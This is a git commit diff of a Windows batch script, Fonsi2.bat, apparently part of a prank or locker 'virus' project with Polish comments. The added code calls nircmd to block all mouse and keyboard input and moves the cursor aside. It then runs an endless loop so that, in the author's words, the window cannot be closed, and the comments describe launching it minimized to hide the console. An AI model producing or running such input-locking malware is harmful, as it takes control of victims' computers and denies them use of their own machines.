c7f482d3fa8f50ee7bf7ee34645a5988733ab158
FonsiWirus <lubiewasa@gmail.com>
2025-04-09 10:57:13 +0200

    Update Fonsi2.bat

--- FonsiFolder/src/Fonsi2.bat
+++ FonsiFolder/src/Fonsi2.bat
@@ -1,13 +1,19 @@
 @echo off
-:: Ścieżka do nircmd.exe (zakłada, że nircmd.exe jest w tym samym folderze co skrypt)
+:: Ukrycie okna konsoli (działa tylko jeśli uruchomisz przez skrót)
+:: Wymaga utworzenia skrótu do .bat i ustawienia go jako uruchamianie "Minimized"
+
+:: Ścieżka do nircmd
 set nircmdPath=%~dp0nircmd.exe
 
-:: Blokowanie myszy i klawiatury
+:: Wyłączenie myszy i klawiatury
 echo Blocking mouse and keyboard...
-%nircmdPath% lockcursor
+%nircmdPath% blockinput 1
 
-:: Czekanie przez 10 sekund
-timeout /t 10 /nobreak > nul
+:: Ukrycie kursora myszy
+%nircmdPath% showsystrayicon 0
+%nircmdPath% setcursor 0 0
 
-:: Uruchomienie Fonsi1.bat
-start "" "%~dp0Fonsi1.bat"
+:: Zapętlenie nieskończone, żeby okno było cały czas aktywne i nie można było go zamknąć
+:loop
+timeout /t 9999 > nul
+goto loop
